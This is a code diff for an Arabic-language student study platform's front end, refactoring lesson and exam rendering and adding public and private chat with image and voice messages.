+                    <button class="btn btn-danger" style="padding:5px 10px; font-size:12px;" onclick="deleteLesson('${id}')"><i class="fas fa-trash"></i></button>
+                   </div>`
+                : '';
+
+            return `
                 <div class="card">
-                    <div class="lesson-thumb" style="background-image:url('${getYoutubeThumb(i.url)}')"></div>
-                    <h4 style="margin:8px 0;">${escapeHtml(i.title || '')}</h4>
-                    <small style="display:block; color:#8b949e; margin-bottom:10px;">${escapeHtml(i.subject || '')}</small>
-                    <button class="btn-accent" onclick="openContent('${escapeAttr(i.url || '')}','${escapeAttr(i.type || 'video')}','${escapeAttr(i.title || '')}')">فتح</button>
-                    ${isAdminUser(user) ? `
-                        <div class="admin-controls">
-                            <button class="btn-pin" onclick="togglePin('lessons','${id}',${Boolean(i.isPinned)})"><i class="fas fa-thumbtack"></i> ${i.isPinned ? 'إلغاء' : 'تثبيت'}</button>
-                            <button class="btn-del" onclick="deleteItem('lessons','${id}')"><i class="fas fa-trash"></i></button>
-                        </div>
-                    ` : ''}
+                    <div class="lesson-thumb" style="background-image:url('${getThumb(item.url)}')"></div>
+                    <h4 style="margin:6px 0;">${isPinSection ? '📌 ' : ''}${esc(item.title)}</h4>
+                    <small style="display:block; color:var(--muted); margin-bottom:10px;">${esc(item.subject || '')}</small>
+                    <button class="btn btn-full" onclick="openLessonItem('${escAttr(item.url)}', '${escAttr(item.type)}', '${escAttr(item.title)}')">فتح</button>
+                    ${adminBtns}
                 </div>
-            `).join('')}</div>`;
+            `;
         }
 
-        function renderPinned() {
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            const pinnedItems = Object.entries(allData).filter(([, item]) => item.isPinned);
-            const container = document.getElementById('pinned-content');
-            if (!container) return;
-
-            if (!pinnedItems.length) {
-                container.innerHTML = `<p style='color:#8b949e'>لا يوجد محتوى مثبت حالياً</p>`;
-                return;
-            }
-
-            container.innerHTML = pinnedItems.map(([id, i]) => `
-                <div class="card" style="border-color:var(--gold)">
-                    <div class="lesson-thumb" style="background-image:url('${getYoutubeThumb(i.url)}')"></div>
-                    <h4 style="margin:8px 0;">📌 ${escapeHtml(i.title || '')}</h4>
-                    <button class="btn-accent" onclick="openContent('${escapeAttr(i.url || '')}','${escapeAttr(i.type || 'video')}','${escapeAttr(i.title || '')}')">فتح</button>
-                    ${isAdminUser(user) ? `
-                        <div class="admin-controls">
-                            <button class="btn-pin" onclick="togglePin('lessons','${id}',true)">إلغاء التثبيت</button>
-                        </div>
-                    ` : ''}
-                </div>
-            `).join('');
-        }
-
-        function renderExams(data) {
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            const container = document.getElementById('exams-list');
-            if (!container) return;
-
-            const entries = Object.entries(data);
-            if (!entries.length) {
-                container.innerHTML = `<p style="color:#8b949e;">لا توجد امتحانات متاحة حالياً.</p>`;
-                return;
-            }
-
-            container.innerHTML = entries.map(([id, exam]) => `
-                <div class="card" style="border-color:var(--green)">
-                    <h3>📝 ${escapeHtml(exam.title || '')}</h3>
-                    <button class="btn-accent" style="background:var(--green); color:#fff; margin-bottom:12px;" onclick="window.open('${escapeAttr(exam.url || '')}','_blank')">ابدأ الامتحان</button>
-                    <div style="background:rgba(0,0,0,0.25); padding:10px; border-radius:10px;">
-                        <small>سجل درجتك بعد الانتهاء:</small>
-                        <div style="display:flex; gap:6px; margin-top:6px;">
-                            <input type="text" id="score-${id}" placeholder="مثلاً 18/20" style="flex:1; background:#000; border:1px solid #30363d; color:#fff; border-radius:8px; padding:8px;">
-                            <button class="btn-accent" style="width:auto; padding:8px 14px;" onclick="submitExamScore('${id}','${escapeAttr(exam.title || '')}')"><i class="fas fa-paper-plane"></i></button>
-                        </div>
-                    </div>
-                    ${isAdminUser(user) ? `
-                        <div class="admin-controls">
-                            <button class="btn-del" onclick="deleteItem('exams','${id}')">حذف الامتحان</button>
-                        </div>
-                    ` : ''}
-                </div>
-            `).join('');
-        }
-
-        function submitExamScore(id, title) {
-            const input = document.getElementById(`score-${id}`);
-            const score = input ? input.value.trim() : '';
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            if (!user) return;
-            if (!score) {
-                return Swal.fire({ title: 'تنبيه', text: 'اكتب درجتك أولاً', icon: 'warning', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-            }
-
-            resultsRef.push({
-                studentName: user.name,
-                studentPhone: user.phone,
-                examTitle: title,
-                score: score,
-                time: new Date().toLocaleString('ar-EG')
-            });
-
-            input.value = '';
-            Swal.fire({ title: 'تم الحفظ ✅', text: 'تم إرسال درجتك بنجاح!', icon: 'success', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-        }
-
-        function loadResultsList(data) {
-            const body = document.getElementById('results-table-body');
-            if (!body) return;
-            const entries = Object.values(data).reverse();
-            if (!entries.length) {
-                body.innerHTML = `<p style="color:#8b949e; padding:10px;">لا توجد نتائج مسجلة بعد.</p>`;
-                return;
-            }
-            body.innerHTML = entries.map(r => `
-                <div class="student-row" style="font-size:12px;">
-                    <span>${escapeHtml(r.studentName || '')}</span>
-                    <span>${escapeHtml(r.examTitle || '')}</span>
-                    <span class="en-num" style="color:var(--accent); font-weight:bold;">${escapeHtml(r.score || '')}</span>
-                    <span class="en-num">${escapeHtml(r.time || '')}</span>
-                </div>
-            `).join('');
-        }
-
-        function loadStudentsList(sortedData) {
-            const body = document.getElementById('students-table-body');
-            if (!body) return;
-
-            if (!sortedData.length) {
-                body.innerHTML = `<p style="color:#8b949e;">لا يوجد طلاب مسجلون بعد.</p>`;
-                return;
-            }
-
-            body.innerHTML = sortedData.map(([phone, details]) => `
-                <div class="card student-card-item" style="margin-bottom:12px; border-right:4px solid var(--accent); text-align:right; padding:14px;">
-                    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px;">
-                        <b style="font-size:15px; color:var(--accent);">${escapeHtml(details.name || '')}</b>
-                        <span class="en-num" style="background:#1f6feb; color:#fff; padding:2px 8px; border-radius:6px; font-size:12px;">${escapeHtml(phone)}</span>
-                    </div>
-                    <div style="margin-top:8px; font-size:12px; color:#8b949e;">
-                        آخر دخول: <span class="en-num">${escapeHtml(details.loginTime || 'غير مسجل')}</span>
-                    </div>
-                    <div style="margin-top:10px; display:flex; gap:8px;">
-                        <button onclick="viewStudentLogs('${escapeAttr(phone)}')" style="flex:1; background:#30363d; color:#fff; border:none; padding:7px; border-radius:8px; cursor:pointer; font-family:'Cairo';"><i class="fas fa-history"></i> السجل</button>
-                        <button onclick="banStudent('${escapeAttr(phone)}')" style="background:var(--danger); color:#fff; border:none; padding:7px 12px; border-radius:8px; cursor:pointer;"><i class="fas fa-user-slash"></i></button>
-                    </div>
-                </div>
-            `).join('');
-        }
-
-        function filterStudents() {
-            const val = document.getElementById('studentSearch').value.toLowerCase();
-            document.querySelectorAll('.student-card-item').forEach(card => {
-                card.style.display = card.innerText.toLowerCase().includes(val) ? 'block' : 'none';
-            });
-        }
-
-        function viewStudentLogs(phone) {
-            logsRef.orderByChild('studentPhone').equalTo(phone).once('value', snap => {
-                const logs = snap.val();
-                if (!logs) {
-                    return Swal.fire({ title: 'السجل', text: 'لا يوجد نشاط مسجل لهذا الطالب.', icon: 'info', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-                }
-                const lines = Object.values(logs).map(l => `• ${l.action}: ${l.title} (${l.time || ''})`).join('\n');
-                Swal.fire({ title: 'سجل النشاط', text: lines, icon: 'info', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-            });
-        }
-
-        function banStudent(phone) {
-            Swal.fire({
-                title: 'تأكيد الحظر',
-                text: 'هل أنت متأكد من حظر هذا الرقم؟',
-                icon: 'warning',
-                showCancelButton: true,
-                confirmButtonText: 'نعم، احظر',
-                cancelButtonText: 'إلغاء',
-                background: '#0d1117',
-                color: '#fff',
-                confirmButtonColor: '#ff4d4d'
-            }).then(res => {
-                if (res.isConfirmed) {
-                    blacklistRef.child(phone).set(true);
-                    showNotification('تم حظر الطالب ✅');
-                }
-            });
-        }
-
-        function togglePin(refName, id, currentStatus) {
-            database.ref(refName).child(id).update({ isPinned: !currentStatus });
-        }
-
-        function deleteItem(refName, id) {
-            Swal.fire({
-                title: 'تأكيد الحذف',
-                text: 'هل أنت متأكد من حذف هذا العنصر؟',
-                icon: 'warning',
-                showCancelButton: true,
-                confirmButtonText: 'حذف',
-                cancelButtonText: 'إلغاء',
-                background: '#0d1117',
-                color: '#fff',
-                confirmButtonColor: '#ff4d4d'
-            }).then(res => {
-                if (res.isConfirmed) {
-                    database.ref(refName).child(id).remove();
-                }
-            });
-        }
-
-        function updateNewsTicker() {
-            const txt = document.getElementById('adm-news-text').value.trim();
-            if (!txt) return;
-            settingsRef.child('newsTicker').set(txt).then(() => {
-                document.getElementById('adm-news-text').value = '';
-                showNotification('تم تحديث شريط الأخبار ✅');
-            });
-        }
-
-        function addExam() {
-            const title = document.getElementById('adm-exam-title').value.trim();
-            const url = document.getElementById('adm-exam-url').value.trim();
-            if (!title || !url) {
-                return Swal.fire({ title: 'تنبيه', text: 'أكمل اسم الامتحان والرابط', icon: 'warning', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-            }
-            examsRef.push({ title, url }).then(() => {
-                document.getElementById('adm-exam-title').value = '';
-                document.getElementById('adm-exam-url').value = '';
-                showNotification('تم نشر الامتحان الجديد ✅');
-            });
-        }
-
-        function renderSubjectGrids() {
+        function renderSubjectCards() {
             const subs = Object.keys(subjectImages);
-            let v = '', f = '', a = '';
-            subs.forEach(s => {
-                const img = subjectImages[s];
-                v += `<div class="subject-card" style="background-image:url('${img}')" onclick="openSubject('${escapeAttr(s)}', 'video')"><h3>${escapeHtml(s)}</h3></div>`;
-                f += `<div class="subject-card" style="background-image:url('${img}')" onclick="openSubject('${escapeAttr(s)}', 'file')"><h3>${escapeHtml(s)}</h3></div>`;
-                a += `<div class="subject-card" style="background-image:url('${img}')" onclick="initiateUpload('${escapeAttr(s)}')"><h3>${escapeHtml(s)}</h3></div>`;
-            });
-            document.getElementById('subjects-grid-video').innerHTML = v;
-            document.getElementById('subjects-grid-file').innerHTML = f;
-            document.getElementById('admin-subjects-grid').innerHTML = a;
+            document.getElementById('video-subjects-grid').innerHTML = subs.map(s =>
+                `<div class="subject-tile" style="background-image:url('${subjectImages[s]}')" onclick="openSubjectList('${escAttr(s)}', 'video')"><h3>${esc(s)}</h3></div>`
+            ).join('');
+
+            document.getElementById('file-subjects-grid').innerHTML = subs.map(s =>
+                `<div class="subject-tile" style="background-image:url('${subjectImages[s]}')" onclick="openSubjectList('${escAttr(s)}', 'file')"><h3>${esc(s)}</h3></div>`
+            ).join('');
+
+            document.getElementById('admin-subjects-grid').innerHTML = subs.map(s =>
+                `<div class="subject-tile" style="background-image:url('${subjectImages[s]}')" onclick="selectAdminSubject('${escAttr(s)}')"><h3>${esc(s)}</h3></div>`
+            ).join('');
         }
 
-        function showSubjects(type) {
-            document.getElementById(type === 'video' ? 'subjects-container-video' : 'subjects-container-file').style.display = 'block';
-            document.getElementById(type === 'video' ? 'specific-subject-videos' : 'specific-subject-files').style.display = 'none';
+        function openSubjectList(subjectName, type) {
+            document.getElementById(type === 'video' ? 'video-subjects-view' : 'file-subjects-view').style.display = 'none';
+            const targetView = document.getElementById(type === 'video' ? 'video-items-view' : 'file-items-view');
+            const targetGrid = document.getElementById(type === 'video' ? 'video-items-grid' : 'file-items-grid');
+            targetView.style.display = 'block';
+
+            const matches = Object.entries(allLessons).filter(([, v]) => v.subject === subjectName && v.type === type);
+            targetGrid.innerHTML = matches.length
+                ? matches.map(([id, v]) => lessonCardHtml(id, v, false)).join('')
+                : `<p style="color:var(--muted);">لا يوجد محتوى لهذه المادة بعد.</p>`;
         }
 
-        function openSubject(name, type) {
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            document.getElementById(type === 'video' ? 'subjects-container-video' : 'subjects-container-file').style.display = 'none';
-            document.getElementById(type === 'video' ? 'specific-subject-videos' : 'specific-subject-files').style.display = 'block';
-
-            const listContainer = document.getElementById(type === 'video' ? 'video-list' : 'file-list');
-            const matches = Object.entries(allData).filter(([, item]) => item.subject === name && item.type === type);
-
-            if (!matches.length) {
-                listContainer.innerHTML = `<p style="color:#8b949e;">لا يوجد محتوى مضاف لهذه المادة بعد.</p>`;
-                return;
-            }
-
-            listContainer.innerHTML = matches.map(([id, item]) => {
-                const thumb = type === 'video' ? getYoutubeThumb(item.url) : 'https://cdn-icons-png.flaticon.com/512/337/337946.png';
-                return `
-                    <div class="card">
-                        <div class="lesson-thumb" style="background-image:url('${thumb}')"></div>
-                        <h4>${escapeHtml(item.title || '')}</h4>
-                        <button class="btn-accent" onclick="openContent('${escapeAttr(item.url || '')}','${escapeAttr(item.type || 'video')}','${escapeAttr(item.title || '')}')">فتح</button>
-                        ${isAdminUser(user) ? `
-                            <div class="admin-controls">
-                                <button class="btn-pin" onclick="togglePin('lessons','${id}',${Boolean(item.isPinned)})">${item.isPinned ? 'إلغاء' : 'تثبيت'}</button>
-                                <button class="btn-del" onclick="deleteItem('lessons','${id}')">حذف</button>
-                            </div>
-                        ` : ''}
-                    </div>
-                `;
-            }).join('');
+        function backToSubjects(type) {
+            document.getElementById(type === 'video' ? 'video-items-view' : 'file-items-view').style.display = 'none';
+            document.getElementById(type === 'video' ? 'video-subjects-view' : 'file-subjects-view').style.display = 'block';
         }
 
-        function showAdminSubjects() {
-            document.getElementById('admin-subjects-selection').style.display = 'block';
-            document.getElementById('admin-upload-form').style.display = 'none';
-        }
-
-        function initiateUpload(subName) {
-            selectedAdminSubject = subName;
-            document.getElementById('current-adm-sub-name').innerText = subName;
-            document.getElementById('admin-subjects-selection').style.display = 'none';
-            document.getElementById('admin-upload-form').style.display = 'block';
-        }
-
-        function handleUpload() {
-            const title = document.getElementById('adm-title').value.trim();
-            const url = document.getElementById('adm-url').value.trim();
-            const type = document.getElementById('adm-type').value;
-
-            if (!title || !url) {
-                return Swal.fire({ title: 'تنبيه', text: 'أكمل العنوان والرابط أولاً', icon: 'warning', background: '#0d1117', color: '#fff', confirmButtonColor: '#FF9800' });
-            }
-
-            lessonsRef.push({
-                title,
-                url,
-                subject: selectedAdminSubject,
-                type,
-                isPinned: false
-            }).then(() => {
-                document.getElementById('adm-title').value = '';
-                document.getElementById('adm-url').value = '';
-                showNotification('تم نشر المحتوى بنجاح ✅');
-                showAdminSubjects();
-            });
-        }
-
-        function openContent(url, type, title) {
-            const user = JSON.parse(localStorage.getItem('kimo_auth_v26'));
-            if (user) {
+        function openLessonItem(url, type, title) {
+            if (currentUser) {
                 logsRef.push({
-                    studentPhone: user.phone,
-                    studentName: user.name,
+                    studentPhone: currentUser.phone,
+                    studentName: currentUser.name,
                     action: type,
                     title: title,
                     time: new Date().toLocaleString('ar-EG')
@@ -1782,136 +1419,497 @@
             }
 
             if (type === 'video') {
-                let finalSrc = url;
+                let src = url;
                 if (url.includes('streamable.com')) {
-                    const vid = url.split('/').pop().split('?')[0];
-                    finalSrc = `https://streamable.com/e/${vid}`;
+                    src = `https://streamable.com/e/${url.split('/').pop().split('?')[0]}`;
                 } else if (url.includes('youtube.com') || url.includes('youtu.be')) {
                     const vid = url.includes('v=') ? url.split('v=')[1].split('&')[0] : url.split('/').pop().split('?')[0];
-                    finalSrc = `https://www.youtube.com/embed/${vid}?autoplay=1&rel=0`;
+                    src = `https://www.youtube.com/embed/${vid}?autoplay=1&rel=0`;
                 }
-
-                document.getElementById('video-title-label').innerText = title || 'مشغل المحاضرة';
-                document.getElementById('video-frame-container').innerHTML = `
-                    <iframe src="${escapeAttr(finalSrc)}" width="100%" height="100%" frameborder="0" allow="autoplay; fullscreen" allowfullscreen></iframe>
-                `;
-                document.getElementById('video-player-overlay').style.display = 'flex';
+                document.getElementById('video-modal-title').innerText = title || 'مشغل الفيديو';
+                document.getElementById('video-modal-body').innerHTML = `<iframe src="${escAttr(src)}" width="100%" height="100%" frameborder="0" allow="autoplay; fullscreen" allowfullscreen></iframe>`;
+                document.getElementById('video-modal').style.display = 'flex';
             } else {
                 window.open(url, '_blank', 'noopener,noreferrer');
             }
         }
 
-        function closeVideo() {
-            document.getElementById('video-player-overlay').style.display = 'none';
-            document.getElementById('video-frame-container').innerHTML = '';
+        function closeVideoModal() {
+            document.getElementById('video-modal').style.display = 'none';
+            document.getElementById('video-modal-body').innerHTML = '';
         }
 
-        function openKimoSearch() {
-            document.getElementById('kimo-search-hub').style.display = 'flex';
-            const input = document.getElementById('kimo-search-input');
-            input.value = '';
-            liveSearchLessons('');
-            input.focus();
+        function renderExamsList() {
+            const entries = Object.entries(allExams);
+            document.getElementById('exams-grid').innerHTML = entries.length
+                ? entries.map(([id, ex]) => `
+                    <div class="card">
+                        <h3 style="margin-top:0;">📝 ${esc(ex.title)}</h3>
+                        <button class="btn btn-green btn-full" style="margin-bottom:10px;" onclick="window.open('${escAttr(ex.url)}', '_blank')">بدء الامتحان</button>
+                        <div style="display:flex; gap:6px;">
+                            <input type="text" id="exam-score-${id}" placeholder="درجتك (مثال: 19/20)">
+                            <button class="btn" onclick="sendExamResult('${id}', '${escAttr(ex.title)}')">حفظ</button>
+                        </div>
+                        ${isAdmin(currentUser) ? `<button class="btn btn-danger btn-full" style="margin-top:8px;" onclick="deleteExam('${id}')">حذف</button>` : ''}
+                    </div>
+                `).join('')
+                : `<p style="color:var(--muted);">لا توجد امتحانات حالياً.</p>`;
         }
 
-        function closeKimoSearch() {
-            document.getElementById('kimo-search-hub').style.display = 'none';
+        function sendExamResult(examId, title) {
+            const inp = document.getElementById('exam-score-' + examId);
+            const score = inp ? inp.value.trim() : '';
+            if (!score || !currentUser) return;
+
+            resultsRef.push({
+                studentName: currentUser.name,
+                studentPhone: currentUser.phone,
+                examTitle: title,
+                score: score,
+                time: new Date().toLocaleString('ar-EG')
+            });
+            inp.value = '';
+            Swal.fire({ title: 'تم الإرسال ✅', text: 'تم تسجيل درجتك بنجاح.', icon: 'success', background: '#0f1520', color: '#fff', confirmButtonColor: '#ff8c00' });
         }
 
-        function liveSearchLessons(query) {
-            const list = document.getElementById('search-results-list');
-            const q = query.trim().toLowerCase();
-            const entries = Object.entries(allData).filter(([, item]) =>
-                !q ||
-                String(item.title || '').toLowerCase().includes(q) ||
-                String(item.subject || '').toLowerCase().includes(q)
-            );
+        // الشات العام (يدعم ملء الشاشة + نص + صورة + فويس + توثيق + شات خاص)
+        function toggleChatFullscreen() {
+            const box = document.getElementById('public-chat-box');
+            const icon = document.getElementById('chat-fs-icon');
+            box.classList.toggle('fullscreen-mode');
+            icon.className = box.classList.contains('fullscreen-mode') ? 'fas fa-compress' : 'fas fa-expand';
+        }
 
-            if (!entries.length) {
-                list.innerHTML = `<p style="color:#8b949e; text-align:center;">لا توجد نتائج مطابقة.</p>`;
+        function renderPublicChat() {
+            const stream = document.getElementById('public-chat-stream');
+            if (!stream) return;
+            const list = window._latestChatList || [];
+            if (!list.length) {
+                stream.innerHTML = `<p style="text-align:center; color:var(--muted); margin:auto;">لا توجد رسائل بعد. ابدأ المحادثة!</p>`;
                 return;
             }
 
-            list.innerHTML = entries.map(([, item]) => `
-                <div style="padding:10px; border-bottom:1px solid #30363d; display:flex; justify-content:space-between; align-items:center; gap:10px;">
-                    <div>
-                        <div style="font-weight:bold;">${escapeHtml(item.title || '')}</div>
-                        <small style="color:#8b949e;">${escapeHtml(item.subject || '')}</small>
+            stream.innerHTML = list.map(([msgId, m]) => {
+                const mine = currentUser && m.phone === currentUser.phone;
+                const av = getUserAvatar(m.phone);
+                const verified = isUserVerified(m.phone);
+
+                let contentHtml = '';
+                if (m.kind === 'image' && m.media) {
+                    contentHtml = `<img src="${m.media}" alt="صورة" style="max-width:240px; max-height:240px; border-radius:10px; display:block; margin-top:4px;">`;
+                } else if (m.kind === 'audio' && m.media) {
+                    contentHtml = `<audio controls src="${m.media}" style="max-width:230px; height:36px; margin-top:4px;"></audio>`;
+                } else {
+                    contentHtml = `<div>${esc(m.text || '')}</div>`;
+                }
+
+                const adminTools = (isAdmin(currentUser) && !mine)
+                    ? `<span style="display:inline-flex; gap:6px; margin-right:6px;">
+                        <button onclick="toggleVerifyUser('${escAttr(m.phone)}')" style="background:none; border:none; color:var(--accent-2); cursor:pointer; font-size:11px; font-family:'Cairo';">${verified ? 'إلغاء التوثيق' : 'توثيق ✔'}</button>
+                        <button onclick="openDirectChat('${escAttr(m.phone)}')" style="background:none; border:none; color:var(--green); cursor:pointer; font-size:11px; font-family:'Cairo';">شات خاص</button>
+                       </span>`
+                    : '';
+
+                return `
+                    <div class="msg-row ${mine ? 'mine' : ''}">
+                        <div class="msg-avatar-sm" onclick="openDirectChat('${escAttr(m.phone)}')" style="cursor:pointer;">
+                            ${av ? `<img src="${av}" style="width:100%; height:100%; object-fit:cover;">` : `<i class="fas fa-user"></i>`}
+                        </div>
+                        <div class="msg-body">
+                            <div class="msg-meta">
+                                <span>
+                                    <strong style="color:var(--accent); cursor:pointer;" onclick="openDirectChat('${escAttr(m.phone)}')">${esc(m.name || 'مستخدم')}</strong>
+                                    ${verified ? `<span class="verified-badge"><i class="fas fa-check"></i></span>` : ''}
+                                    ${adminTools}
+                                </span>
+                                <small class="en-num" style="color:var(--muted);">${esc(m.time || '')}</small>
+                            </div>
+                            ${contentHtml}
+                        </div>
                     </div>
-                    <button class="btn-accent" style="width:auto; padding:6px 14px; font-size:12px;" onclick="closeKimoSearch(); openContent('${escapeAttr(item.url || '')}','${escapeAttr(item.type || 'video')}','${escapeAttr(item.title || '')}')">فتح</button>
-                </div>
-            `).join('');
+                `;
+            }).join('');
+
+            stream.scrollTop = stream.scrollHeight;
         }
 
-        function shareKimo() {
-            const shareData = {
-                title: 'كيمو أكاديمي 2026',
-                text: 'ذاكر على منصة كيمو أكاديمي - مراجعات وامتحانات ثانوية عامة 2026 🔥',
-                url: window.location.href
+        function sendPublicTextMessage() {
+            const inp = document.getElementById('public-chat-input');
+            const text = inp.value.trim();
+            if (!text || !currentUser) return;
+
+            chatRef.push({
+                kind: 'text',
+                text: text,
+                name: currentUser.name,
+                phone: currentUser.phone,
+                time: new Date().toLocaleTimeString('ar-EG')
+            });
+            inp.value = '';
+        }
+
+        function sendChatImage(input) {
+            if (!input.files || !input.files[0] || !currentUser) return;
+            const file = input.files[0];
+            if (!file.type.startsWith('image/')) return;
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                chatRef.push({
+                    kind: 'image',
+                    media: e.target.result,
+                    name: currentUser.name,
+                    phone: currentUser.phone,
+                    time: new Date().toLocaleTimeString('ar-EG')
+                });
             };
-            if (navigator.share) {
-                navigator.share(shareData).catch(() => {});
-            } else if (navigator.clipboard) {
-                navigator.clipboard.writeText(window.location.href);
-                showNotification('تم نسخ رابط المنصة بنجاح ✅');
+            reader.readAsDataURL(file);
+            input.value = '';
+        }
+
+        // تسجيل الفويس (للشات العام أو الشات الخاص)
+        async function toggleVoiceRecording(scope) {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+                return;
+            }
+
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                return Swal.fire({ title: 'غير مدعوم', text: 'المتصفح لا يدعم تسجيل الصوت.', icon: 'info', background: '#0f1520', color: '#fff' });
+            }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                audioChunks = [];
+                recordingScope = scope;
+                mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = ev => {
+                    if (ev.data.size > 0) audioChunks.push(ev.data);
+                };
+
+                mediaRecorder.onstop = () => {
+                    stream.getTracks().forEach(t => t.stop());
+                    const blob = new Blob(audioChunks, { type: 'audio/webm' });
+                    const reader = new FileReader();
+                    reader.onload = function(e) {
+                        const audioBase64 = e.target.result;
+                        const timeNow = new Date().toLocaleTimeString('ar-EG');
+                        if (recordingScope === 'dm') {
+                            const ref = getDirectRoomRef(currentUser.phone, activeDmPartnerPhone);
+                            ref.push({
+                                kind: 'audio',
+                                media: audioBase64,
+                                senderPhone: currentUser.phone,
+                                senderName: currentUser.name,
+                                time: timeNow
+                            });
+                        } else {
+                            chatRef.push({
+                                kind: 'audio',
+                                media: audioBase64,
+                                name: currentUser.name,
+                                phone: currentUser.phone,
+                                time: timeNow
+                            });
+                        }
+                    };
+                    reader.readAsDataURL(blob);
+                    resetVoiceButtons();
+                };
+
+                mediaRecorder.start();
+                if (scope === 'dm') {
+                    document.getElementById('dm-voice-label').innerText = 'إيقاف';
+                    document.getElementById('dm-voice-btn').style.borderColor = 'var(--danger)';
+                } else {
+                    document.getElementById('public-voice-label').innerText = 'إيقاف';
+                    document.getElementById('public-voice-btn').style.borderColor = 'var(--danger)';
+                }
+            } catch (e) {
+                Swal.fire({ title: 'تنبيه', text: 'يرجى السماح بالمايكروفون لتسجيل الفويس.', icon: 'warning', background: '#0f1520', color: '#fff' });
             }
         }
 
+        function resetVoiceButtons() {
+            const pLbl = document.getElementById('public-voice-label');
+            const pBtn = document.getElementById('public-voice-btn');
+            const dLbl = document.getElementById('dm-voice-label');
+            const dBtn = document.getElementById('dm-voice-btn');
+            if (pLbl) pLbl.innerText = 'فويس';
+            if (pBtn) pBtn.style.borderColor = '';
+            if (dLbl) dLbl.innerText = 'فويس';
+            if (dBtn) dBtn.style.borderColor = '';
+        }
+
+        // الشات الخاص الثنائي
+        function getDirectRoomRef(phoneA, phoneB) {
+            const pair = [String(phoneA), String(phoneB)].sort().join('_');
+            return directChatsRef.child(pair);
+        }
+
+        function populateDmTargetSelect() {
+            const sel = document.getElementById('dm-target-select');
+            if (!sel || !currentUser) return;
+            const entries = Object.entries(allStudentsMap).filter(([ph]) => ph !== currentUser.phone);
+            sel.innerHTML = entries.map(([ph, st]) =>
+                `<option value="${escAttr(ph)}">${esc(st.name || ph)} (${esc(ph)})</option>`
+            ).join('');
+            if (activeDmPartnerPhone && sel.querySelector(`option[value="${activeDmPartnerPhone}"]`)) {
+                sel.value = activeDmPartnerPhone;
+            }
+        }
+
+        function openDirectChat(targetPhone) {
+            if (!currentUser) return;
+
+            if (isAdmin(currentUser)) {
+                document.getElementById('dm-partner-picker').style.display = 'block';
+                const firstStudent = Object.keys(allStudentsMap).find(ph => ph !== currentUser.phone);
+                activeDmPartnerPhone = targetPhone || activeDmPartnerPhone || firstStudent || currentUser.phone;
+                populateDmTargetSelect();
+            } else {
+                document.getElementById('dm-partner-picker').style.display = 'none';
+                activeDmPartnerPhone = ADMIN_PHONES[0];
+            }
+
+            selectDmPartner(activeDmPartnerPhone);
+            document.getElementById('dm-screen').style.display = 'flex';
+        }
+
+        function closeDirectChat() {
+            document.getElementById('dm-screen').style.display = 'none';
+            if (activeDmRef) {
+                activeDmRef.off();
+                activeDmRef = null;
+            }
+        }
+
+        function selectDmPartner(phone) {
+            if (!currentUser || !phone) return;
+            activeDmPartnerPhone = phone;
+
+            if (activeDmRef) activeDmRef.off();
+
+            const partnerObj = allStudentsMap[phone];
+            const partnerName = ADMIN_PHONES.includes(phone)
+                ? 'كيمو (الإدارة)'
+                : ((partnerObj && partnerObj.name) || phone);
+
+            document.getElementById('dm-partner-name').innerHTML =
+                `${esc(partnerName)} ${isUserVerified(phone) ? `<span class="verified-badge"><i class="fas fa-check"></i></span>` : ''}`;
+            document.getElementById('dm-partner-sub').innerText = partnerObj && partnerObj.stage ? partnerObj.stage : 'محادثة خاصة مباشرة';
+
+            activeDmRef = getDirectRoomRef(currentUser.phone, phone);
+            activeDmRef.limitToLast(80).on('value', snap => {
+                const msgs = Object.values(snap.val() || {});
+                const box = document.getElementById('dm-messages-stream');
+                if (!msgs.length) {
+                    box.innerHTML = `<p style="text-align:center; color:var(--muted); margin:auto;">ابدأ المحادثة الخاصة الآن...</p>`;
+                    return;
+                }
+                box.innerHTML = msgs.map(m => {
+                    const mine = m.senderPhone === currentUser.phone;
+                    let body = '';
+                    if (m.kind === 'image' && m.media) {
+                        body = `<img src="${m.media}" style="max-width:230px; max-height:230px; border-radius:10px; display:block;">`;
+                    } else if (m.kind === 'audio' && m.media) {
+                        body = `<audio controls src="${m.media}" style="max-width:230px; height:36px;"></audio>`;
+                    } else {
+                        body = `<div>${esc(m.text || '')}</div>`;
+                    }
+                    return `
+                        <div class="msg-row ${mine ? 'mine' : ''}">
+                            <div class="msg-body">
+                                <div class="msg-meta">
+                                    <strong style="color:var(--accent-2);">${esc(m.senderName || '')}</strong>
+                                    <small class="en-num" style="color:var(--muted);">${esc(m.time || '')}</small>
+                                </div>
+                                ${body}
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+                box.scrollTop = box.scrollHeight;
+            });
+        }
+
+        function sendDirectTextMessage() {
+            const inp = document.getElementById('dm-text-input');
+            const text = inp.value.trim();
+            if (!text || !currentUser || !activeDmPartnerPhone) return;
+
+            getDirectRoomRef(currentUser.phone, activeDmPartnerPhone).push({
+                kind: 'text',
+                text: text,
+                senderPhone: currentUser.phone,
+                senderName: currentUser.name,
+                time: new Date().toLocaleTimeString('ar-EG')
+            });
+            inp.value = '';
+        }
+
+        function sendDirectImage(input) {
+            if (!input.files || !input.files[0] || !currentUser || !activeDmPartnerPhone) return;
+            const file = input.files[0];
+            if (!file.type.startsWith('image/')) return;
+
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                getDirectRoomRef(currentUser.phone, activeDmPartnerPhone).push({
+                    kind: 'image',
+                    media: e.target.result,
+                    senderPhone: currentUser.phone,
+                    senderName: currentUser.name,
+                    time: new Date().toLocaleTimeString('ar-EG')
+                });
+            };
+            reader.readAsDataURL(file);
+            input.value = '';
+        }
+
+        // إدارة وتوثيق المستخدمين للأدمن
